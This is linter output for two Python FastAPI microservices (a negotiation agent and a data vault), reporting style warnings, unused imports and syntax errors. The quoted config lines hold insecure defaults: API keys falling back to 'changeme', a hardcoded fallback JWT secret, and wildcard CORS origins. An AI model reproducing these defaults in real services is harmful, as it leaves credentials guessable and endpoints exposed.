141 |             self.tokens[client_id] = (self.burst - 1, now)
142 |             return True
143 |         
    | ^^^^^^^^
144 |         tokens, last_update = self.tokens[client_id]
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:145:1
    |
144 |         tokens, last_update = self.tokens[client_id]
145 |         
    | ^^^^^^^^
146 |         # Add tokens based on time elapsed
147 |         elapsed = now - last_update
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:149:1
    |
147 |         elapsed = now - last_update
148 |         tokens = min(self.burst, tokens + elapsed * self.rate)
149 |         
    | ^^^^^^^^
150 |         if tokens >= 1:
151 |             self.tokens[client_id] = (tokens - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:160:1
    |
158 | class AuthenticationMiddleware(BaseHTTPMiddleware):
159 |     """Authentication middleware"""
160 |     
    | ^^^^
161 |     # Public endpoints that don't require authentication
162 |     PUBLIC_PATHS = [
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:173:1
    |
171 |         "/api/v1/openapi.json",
172 |     ]
173 |     
    | ^^^^
174 |     async def dispatch(self, request: Request, call_next: Callable):
175 |         # Skip public endpoints
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:178:1
    |
176 |         if request.url.path in self.PUBLIC_PATHS:
177 |             return await call_next(request)
178 |         
    | ^^^^^^^^
179 |         # Try authentication
180 |         authenticated = False
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:182:1
    |
180 |         authenticated = False
181 |         user = None
182 |         
    | ^^^^^^^^
183 | # Try API key authentication
184 |         api_key = request.headers.get("X-API-Key")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:210:1
    |
208 |                 headers={"WWW-Authenticate": "Bearer"},
209 |             )
210 |         
    | ^^^^^^^^
211 |         # Add user to request state
212 |         request.state.user = user
    |
help: Remove whitespace from blank line

invalid-syntax: unindent does not match any outer indentation level
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:212:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
    | ^^^^^^^^
213 |         
214 |         return await call_next(request)
    |

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:213:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
213 |         
    | ^^^^^^^^
214 |         return await call_next(request)
    |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\autonomous-negotiation-agent\app\middleware.py:214:1
    |
212 |         request.state.user = user
213 |         
214 |         return await call_next(request)
    | ^^^^^^^^
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\models.py:17:20
   |
15 |     participant_id: str
16 |     topic: str
17 |     current_offer: Dict[str, Any]
   |                    ^^^^
18 |     history: List[Dict[str, Any]] = []
19 |     status: str = "opening"  # opening, active, agreed, failed, expired
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\models.py:18:14
   |
16 |     topic: str
17 |     current_offer: Dict[str, Any]
18 |     history: List[Dict[str, Any]] = []
   |              ^^^^
19 |     status: str = "opening"  # opening, active, agreed, failed, expired
20 |     constraints: Dict[str, Any] = {}
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\models.py:18:19
   |
16 |     topic: str
17 |     current_offer: Dict[str, Any]
18 |     history: List[Dict[str, Any]] = []
   |                   ^^^^
19 |     status: str = "opening"  # opening, active, agreed, failed, expired
20 |     constraints: Dict[str, Any] = {}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\models.py:20:18
   |
18 |     history: List[Dict[str, Any]] = []
19 |     status: str = "opening"  # opening, active, agreed, failed, expired
20 |     constraints: Dict[str, Any] = {}
   |                  ^^^^
21 |     contract_id: Optional[UUID] = None
22 |     created_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-negotiation-agent\app\models.py:21:18
   |
19 |     status: str = "opening"  # opening, active, agreed, failed, expired
20 |     constraints: Dict[str, Any] = {}
21 |     contract_id: Optional[UUID] = None
   |                  ^^^^^^^^^^^^^^
22 |     created_at: datetime = Field(default_factory=datetime.now)
23 |     updated_at: datetime = Field(default_factory=datetime.now)
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\models.py:28:14
   |
26 | class NegotiationOffer(BaseModel):
27 |     sender_id: str
28 |     content: Dict[str, Any]
   |              ^^^^
29 |     rationale: str
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\models.py:35:12
   |
33 |     id: UUID = Field(default_factory=uuid4)
34 |     session_id: UUID
35 |     terms: Dict[str, Any]
   |            ^^^^
36 |     signatures: Dict[str, str]  # Agent ID -> Ed25519 signature
37 |     signed_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\models.py:36:17
   |
34 |     session_id: UUID
35 |     terms: Dict[str, Any]
36 |     signatures: Dict[str, str]  # Agent ID -> Ed25519 signature
   |                 ^^^^
37 |     signed_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `dict`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\app\repository.py:5:22
  |
3 | """
4 |
5 | from datetime import datetime
  |                      ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import: `datetime.datetime`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\app\repository.py:6:31
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  |                               ^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\app\repository.py:6:47
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                               ^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\repository.py:15:20
   |
13 | class Database:
14 |     def __init__(self):
15 |         self.data: Dict[str, Any] = {"sessions": {}, "contracts": {}}
   |                    ^^^^
16 |         self.connected = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-negotiation-agent\app\repository.py:30:54
   |
28 |         self.db = database
29 |
30 |     async def get_session(self, session_id: UUID) -> Optional[NegotiationSession]:
   |                                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
31 |         return self.db.data["sessions"].get(str(session_id))
   |
help: Convert to `X | None`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\routes.py:5:1
  |
3 | """
4 |
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
6 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\app\routes.py:5:20
  |
3 | """
4 |
5 | from typing import List
  |                    ^^^^
6 | from uuid import UUID
  |
help: Remove unused import: `typing.List`

F401 [*] `fastapi.Query` imported but unused
  --> emergent-microservices\autonomous-negotiation-agent\app\routes.py:8:53
   |
 6 | from uuid import UUID
 7 |
 8 | from fastapi import APIRouter, Body, Depends, Path, Query, status
   |                                                     ^^^^^
 9 |
10 | from .logging_config import logger
   |
help: Remove unused import: `fastapi.Query`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> emergent-microservices\autonomous-negotiation-agent\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> emergent-microservices\autonomous-negotiation-agent\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-negotiation-agent\app\security.py:32:44
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\security.py:32:53
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                                     ^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-negotiation-agent\app\security.py:49:37
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\security.py:49:46
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                              ^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> emergent-microservices\autonomous-negotiation-agent\app\security.py:103:19
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                   ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> emergent-microservices\autonomous-negotiation-agent\app\security.py:103:29
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                             ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `list`

F401 [*] `datetime.timezone` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\app\services.py:5:32
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                                ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import: `datetime.timezone`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\autonomous-negotiation-agent\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.Any` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\app\services.py:6:20
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                    ^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\app\services.py:6:31
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                               ^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\app\services.py:6:37
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                     ^^^^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\app\services.py:6:47
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                               ^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-negotiation-agent\app\services.py:56:45
   |
55 |     async def finalize_agreement(
56 |         self, session_id: UUID, signatures: Dict[str, str]
   |                                             ^^^^
57 |     ) -> AgreedContract:
58 |         """Seal a negotiation session with a signed contract"""
   |
help: Replace with `dict`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-negotiation-agent\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\autonomous-negotiation-agent\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\database\scripts\integrity_check.py:7:20
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                    ^^^^
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\database\scripts\integrity_check.py:7:26
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                          ^^^^^
  |
help: Remove unused import

F821 Undefined name `check_integrity`
  --> emergent-microservices\autonomous-negotiation-agent\database\scripts\integrity_check.py:13:20
   |
11 |     print("Running database integrity checks...")
12 |
13 |     errors = await check_integrity()
   |                    ^^^^^^^^^^^^^^^
14 |
15 |     if errors:
   |

F821 Undefined name `rollback_migration`
  --> emergent-microservices\autonomous-negotiation-agent\database\scripts\rollback.py:16:21
   |
15 |     version = int(sys.argv[1])
16 |     success = await rollback_migration(version)
   |                     ^^^^^^^^^^^^^^^^^^
17 |     sys.exit(0 if success else 1)
   |

invalid-syntax: missing closing quote in string literal
 --> emergent-microservices\autonomous-negotiation-agent\setup.py:6:17
  |
4 |     name="Autonomous Negotiation Agent Infrastructure",
5 |     version="1.0.0",
6 |     description="Build an agent system that:
  |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | Negotiates contracts via structured constraints
8 | Produces verifiable agreements
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-negotiation-agent\setup.py:7:1
  |
5 |     version="1.0.0",
6 |     description="Build an agent system that:
7 | Negotiates contracts via structured constraints
  | ^^^^^^^^^^
8 | Produces verifiable agreements
9 | Signs with cryptographic identity
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-negotiation-agent\setup.py:7:12
  |
5 |     version="1.0.0",
6 |     description="Build an agent system that:
7 | Negotiates contracts via structured constraints
  |            ^^^^^^^^^
8 | Produces verifiable agreements
9 | Signs with cryptographic identity
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-negotiation-agent\setup.py:7:22
  |
5 |     version="1.0.0",
6 |     description="Build an agent system that:
7 | Negotiates contracts via structured constraints
  |                      ^^^
8 | Produces verifiable agreements
9 | Signs with cryptographic identity
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-negotiation-agent\setup.py:7:26
  |
5 |     version="1.0.0",
6 |     description="Build an agent system that:
7 | Negotiates contracts via structured constraints
  |                          ^^^^^^^^^^
8 | Produces verifiable agreements
9 | Signs with cryptographic identity
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-negotiation-agent\setup.py:7:37
  |
5 |     version="1.0.0",
6 |     description="Build an agent system that:
7 | Negotiates contracts via structured constraints
  |                                     ^^^^^^^^^^^
8 | Produces verifiable agreements
9 | Signs with cryptographic identity
  |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:8:1
   |
 6 |     description="Build an agent system that:
 7 | Negotiates contracts via structured constraints
 8 | Produces verifiable agreements
   | ^^^^^^^^
 9 | Signs with cryptographic identity
10 | Tracks performance obligations
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:8:10
   |
 6 |     description="Build an agent system that:
 7 | Negotiates contracts via structured constraints
 8 | Produces verifiable agreements
   |          ^^^^^^^^^^
 9 | Signs with cryptographic identity
10 | Tracks performance obligations
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:8:21
   |
 6 |     description="Build an agent system that:
 7 | Negotiates contracts via structured constraints
 8 | Produces verifiable agreements
   |                     ^^^^^^^^^^
 9 | Signs with cryptographic identity
10 | Tracks performance obligations
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:9:1
   |
 7 | Negotiates contracts via structured constraints
 8 | Produces verifiable agreements
 9 | Signs with cryptographic identity
   | ^^^^^
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
   |

invalid-syntax: Expected `)`, found `with`
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:9:7
   |
 7 | Negotiates contracts via structured constraints
 8 | Produces verifiable agreements
 9 | Signs with cryptographic identity
   |       ^^^^
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:9:26
   |
 7 | Negotiates contracts via structured constraints
 8 | Produces verifiable agreements
 9 | Signs with cryptographic identity
   |                          ^^^^^^^^
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
   |

invalid-syntax: Expected `:`, found newline
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:9:34
   |
 7 | Negotiates contracts via structured constraints
 8 | Produces verifiable agreements
 9 | Signs with cryptographic identity
   |                                  ^
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
   |

invalid-syntax: Expected an indented block after `with` statement
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:10:1
   |
 8 | Produces verifiable agreements
 9 | Signs with cryptographic identity
10 | Tracks performance obligations
   | ^^^^^^
11 | Auto-triggers dispute arbitration logic
12 | This is programmable legal infrastructure.",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:10:8
   |
 8 | Produces verifiable agreements
 9 | Signs with cryptographic identity
10 | Tracks performance obligations
   |        ^^^^^^^^^^^
11 | Auto-triggers dispute arbitration logic
12 | This is programmable legal infrastructure.",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:10:20
   |
 8 | Produces verifiable agreements
 9 | Signs with cryptographic identity
10 | Tracks performance obligations
   |                    ^^^^^^^^^^^
11 | Auto-triggers dispute arbitration logic
12 | This is programmable legal infrastructure.",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:11:15
   |
 9 | Signs with cryptographic identity
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
   |               ^^^^^^^
12 | This is programmable legal infrastructure.",
13 |     author="IAmSoThirsty",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:11:23
   |
 9 | Signs with cryptographic identity
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
   |                       ^^^^^^^^^^^
12 | This is programmable legal infrastructure.",
13 |     author="IAmSoThirsty",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:11:35
   |
 9 | Signs with cryptographic identity
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
   |                                   ^^^^^
12 | This is programmable legal infrastructure.",
13 |     author="IAmSoThirsty",
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:12:22
   |
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
12 | This is programmable legal infrastructure.",
   |                      ^^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:12:28
   |
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
12 | This is programmable legal infrastructure.",
   |                            ^^^^^^^^^^^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:12:43
   |
10 | Tracks performance obligations
11 | Auto-triggers dispute arbitration logic
12 | This is programmable legal infrastructure.",
   |                                           ^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:13:1
   |
11 | Auto-triggers dispute arbitration logic
12 | This is programmable legal infrastructure.",
13 |     author="IAmSoThirsty",
   | ^^^^
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
15 |     python_requires=">=3.11",
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:35:1
   |
33 |         ],
34 |     },
35 | )
   | ^
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-negotiation-agent\setup.py:35:2
   |
33 |         ],
34 |     },
35 | )
   |  ^
   |

UP035 [*] Import from `collections.abc` instead: `AsyncGenerator`
 --> emergent-microservices\autonomous-negotiation-agent\tests\conftest.py:4:1
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Import from `collections.abc`

F401 [*] `typing.AsyncGenerator` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\tests\conftest.py:4:20
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  |                    ^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Remove unused import: `typing.AsyncGenerator`

F704 `await` statement outside of a function
  --> emergent-microservices\autonomous-negotiation-agent\tests\conftest.py:30:1
   |
29 | database.data.clear()
30 | await database.disconnect()
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `pytest` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\tests\test_main.py:3:8
  |
1 | """Test main application"""
2 |
3 | import pytest
  |        ^^^^^^
4 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\tests\test_routes.py:5:8
  |
3 | from uuid import uuid4
4 |
5 | import pytest
  |        ^^^^^^
6 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `app.main.app` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\tests\test_routes.py:8:22
  |
6 | from fastapi.testclient import TestClient
7 |
8 | from app.main import app
  |                      ^^^
  |
help: Remove unused import: `app.main.app`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\tests\test_security.py:3:8
  |
1 | """Test security functions"""
2 |
3 | import pytest
  |        ^^^^^^
4 |
5 | from app.security import (
  |
help: Remove unused import: `pytest`

F401 [*] `app.models.ItemUpdate` imported but unused
 --> emergent-microservices\autonomous-negotiation-agent\tests\test_services.py:8:36
  |
7 | from app.errors import NotFoundError
8 | from app.models import ItemCreate, ItemUpdate
  |                                    ^^^^^^^^^^
9 | from app.services import ItemService
  |
help: Remove unused import: `app.models.ItemUpdate`

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\config.py:12:1
   |
10 | class Settings(BaseSettings):
11 |     """Application settings with validation"""
12 |     
   | ^^^^
13 |     # Service Metadata
14 |     SERVICE_NAME: str = "Sovereign Data Vault Layer"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\config.py:17:1
   |
15 |     VERSION: str = "1.0.0"
16 |     ENVIRONMENT: str = Field(default="development", pattern="^(development|staging|production)$")
17 |     
   | ^^^^
18 |     # Server Configuration
19 |     HOST: str = "0.0.0.0"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\config.py:22:1
   |
20 |     PORT: int = 8000
21 |     API_PREFIX: str = "/api/v1"
22 |     
   | ^^^^
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\sovereign-data-vault\app\config.py:25:1
   |
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
   | ^^^^
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\sovereign-data-vault\app\config.py:26:1
   |
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
   | ^
27 |     JWT_ALGORITHM: str = "HS256"
28 |     JWT_EXPIRY_HOURS: int = 24
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\sovereign-data-vault\app\config.py:27:1
   |
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   | ^^^^
28 |     JWT_EXPIRY_HOURS: int = 24
29 | # Rate Limiting
   |

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\config.py:32:1
   |
30 |     RATE_LIMIT_PER_MINUTE: int = 500
31 |     RATE_LIMIT_BURST: int = 900
32 |     
   | ^^^^
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\config.py:35:1
   |
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
35 |     
   | ^^^^
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\sovereign-data-vault\app\config.py:37:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   | ^
38 |     DB_TIMEOUT: int = 30
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\sovereign-data-vault\app\config.py:38:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
   | ^^^^
39 |     
40 |     # Observability
   |

W293 Blank line contains whitespace
